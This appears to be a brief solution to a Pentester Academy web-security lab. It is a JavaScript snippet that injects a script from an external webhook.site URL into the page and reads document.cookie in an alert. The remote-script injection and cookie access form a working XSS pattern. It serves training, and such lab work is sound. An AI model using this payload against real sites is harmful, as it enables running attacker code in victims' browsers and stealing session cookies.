// https://pentesteracademylab.appspot.com/lab/webapp/jfp/9

// Objectives:
//     Include an external JS file into this page
//     Code inside that JS should pop the cookie inside an alert box


// Add js file
var js = document.createElement('script');
js.src = 'https://webhook.site/9dc7264d-4455-46aa-83e8-2083096f8b57';
js.type = "text/javascript";
document.body.appendChild(js);

// Add following in the js file
alert(document.cookie)